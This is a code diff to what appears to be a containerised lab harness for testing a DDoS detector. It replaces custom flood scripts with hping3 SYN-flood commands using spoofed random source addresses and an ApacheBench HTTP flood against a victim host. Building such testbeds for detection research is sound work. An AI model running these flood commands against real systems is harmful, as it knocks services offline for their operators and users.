@@ -26,7 +26,8 @@ def dexec(container, *args, detach=False):
 def kill_all():
     dexec(DETECTOR, "pkill", "-f", "detector.py")
     for a in ATTACKERS:
-        dexec(a, "pkill", "-f", "flood.py")
+        dexec(a, "pkill", "-f", "hping3")
+        dexec(a, "pkill", "-f", "ab")
 
 
 def say(msg, color="c"):
@@ -56,11 +57,12 @@ def preflight():
 def attack(mode, n, spoof, dur):
     for a in ATTACKERS[:n]:
         if mode == "syn":
-            cmd = ["timeout", str(dur), "python3", "/app/syn_flood.py", VICTIM, "-p", "80"]
+            cmd = ["timeout", str(dur), "hping3", "-S", "-p", "80", "-q"]
             if spoof:
-                cmd.append("--spoof")
+                cmd.append("--rand-source")
+            cmd += ["-i", "u2500", VICTIM]
         else:
-            cmd = ["python3", "/app/http_flood.py", VICTIM, "-p", "80", "-t", "20", "-d", str(dur)]
+            cmd = ["timeout", str(dur), "ab", "-k", "-c", "30", "-t", str(dur), "-n", "10000000", f"http://{VICTIM}/"]
         r = dexec(a, *cmd, detach=True)
         if r.returncode != 0:
             print(CLR["r"] + f"[!] Khong khoi dong duoc tan cong tren {a}: {r.stderr.strip()}" + CLR["0"])
